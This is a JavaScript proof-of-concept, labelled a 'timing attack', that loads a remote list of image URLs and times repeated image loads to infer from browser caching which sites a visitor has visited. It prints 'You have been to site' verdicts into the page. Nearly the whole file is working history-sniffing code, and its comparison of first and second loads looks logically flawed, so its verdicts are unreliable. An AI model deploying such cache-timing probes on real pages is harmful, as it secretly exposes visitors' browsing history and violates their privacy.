function ajaxRequest(){
 var activexmodes=["Msxml2.XMLHTTP", "Microsoft.XMLHTTP"] //activeX versions to check for in IE
 if (window.ActiveXObject){ //Test for support for ActiveXObject in IE first (as XMLHttpRequest in IE7 is broken)
  for (var i=0; i<activexmodes.length; i++){
   try{
    return new ActiveXObject(activexmodes[i])
   }
   catch(e){
    //suppress error
   }
  }
 }
 else if (window.XMLHttpRequest) // if Mozilla, Safari etc
  return new XMLHttpRequest()
 else
  return false
}

/*parser*/

url_loader = function(text_url){
	this.url_list = new Array();
	var raw_list = new ajaxRequest();
	raw_list.open("GET", text_url, false);
	raw_list.send(null);
	var resp_list = raw_list.responseText;
	var split_list = resp_list.split('\n');
	for (var index in split_list){
		this.url_list.push(split_list[index]);
	}
}



/*timing attack*/


	var loader = new url_loader("http://www.joeygolden.com/WebTracking/imagelist.txt");
	var blind_run_start = new Array();
	var blind_run_end = new Array();
	var cache_run_start = new Array();
	var cache_run_end = new Array();
	var image_list = new Array();
	var images_loaded_blind = 0;
	var images_loaded_cache = 0;
	
	blind_run_onload = function(){
		var timer_end = new Date();
		blind_run_end[images_loaded_blind] = timer_end.getTime();
		images_loaded_blind++;
		if (images_loaded_blind < loader.url_list.length){
			var timer_start = new Date();
			blind_run_start[images_loaded_blind] = timer_start.getTime();
			var image_blind_run = new Image();
			image_blind_run.onload = blind_run_onload;
			image_blind_run.src = loader.url_list[images_loaded_blind];
		}else{
			cache_run_begin();
		}
	}
	cache_run_begin = function(){
		var timer = new Date();
		cache_run_start[images_loaded_cache] = timer.getTime();
		
		var image_cache_run = new Image();
		image_list.push(image_cache_run);
		image_cache_run.onload = cache_run_onload;
		
		image_cache_run.src = loader.url_list[images_loaded_cache];
	}
	cache_run_onload = function(){
		var timer_end = new Date();
		cache_run_end[images_loaded_cache] = timer_end.getTime();
		images_loaded_cache++;
		if (images_loaded_cache < loader.url_list.length){
			var timer_start = new Date();
			cache_run_start[images_loaded_cache] = timer_start.getTime();
			var image_cache_run = new Image();
			image_cache_run.onload = cache_run_onload;
			image_cache_run.src = loader.url_list[images_loaded_cache];
		}else{
			setTimeout("output_test()", 1000);
		}
	}
	
		var timer = new Date();
		blind_run_start[images_loaded_blind] = timer.getTime();
		
		var image_blind_run = new Image();
		image_list.push(image_blind_run);
		image_blind_run.onload = blind_run_onload;
		
		image_blind_run.src = loader.url_list[images_loaded_blind];

	


output_test = function(){
	
	for (var index in loader.url_list){
		if(((blind_run_end[index] - blind_run_start[index])-(cache_run_end[index] - cache_run_start[index]))< 25){
			document.writeln("<b>You have been to site:      </b>");
			document.writeln(loader.url_list[index]);
			document.writeln("<b>      determined using image:</b>");
			document.writeln("<img src = '");
			document.writeln(loader.url_list[index]);
			document.writeln("'></img>>");
			document.writeln("<br/>");
		}else{
			document.writeln("<b>You have <u> NOT </u> been to site:      </b>");
			document.writeln(loader.url_list[index]);
			document.writeln("<b>      determined using image:</b>");
			document.writeln("<img src = '");
			document.writeln(loader.url_list[index]);
			document.writeln("'></img>>");
			document.writeln("<br/>");			
		}
	}
}


	/*
	
	for (var index in loader.url_list){
		//var run_request = new ajaxRequest();
		var timer1 = new Date();
		var start_time = timer1.getTime();
		
		//run_request.open("GET", (loader.url_list[index]), false);
		//run_request.send(null);
		
		var timer2 = new Date();
		var end_time = timer2.getTime();
		var difference = end_time - start_time;
		cache_run.push(difference);
	}
	for (var index in blind_run){
		document.writeln(blind_run[index]-cache_run[index]);
	}
*/
